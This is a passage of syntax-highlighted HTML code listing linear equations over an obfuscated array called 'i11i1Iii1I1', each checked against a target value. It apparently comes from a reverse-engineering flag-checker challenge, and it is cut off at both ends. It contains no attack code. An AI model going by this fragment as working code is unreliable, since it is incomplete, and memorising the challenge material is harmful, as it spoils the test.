number\">52041</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">29</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">26</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">90</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">69</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">69</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">46</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">65</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">39</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">20253</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">45</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">56</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">650</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">900</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">44</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">69</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">406</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">651</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">69</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">18768</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">555</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">70</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">510</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">90</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">499</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">610</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">221</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">102</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2050</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">406</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">665</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">333</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">100</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">609</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">777</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">201</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">111844</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">333</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4444</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">5555</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">676</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">660</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">73</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">107</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">250</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">65</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">39</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">69</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">777</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">201</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">159029</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">520</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">222</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">333</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">56655</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">220</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">99</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">73</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1007</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">7777</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2500</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">605</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">390</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">100</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">609</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">99999</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">210</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">232</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2762025</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">1323</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">333</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">55</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">660</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">220</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">99</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">100</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">777</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2500</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">605</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">390</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">100</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">609</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9999</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">210</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">232</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">25</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1551621</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">777</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">6969</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">55</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">666</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token 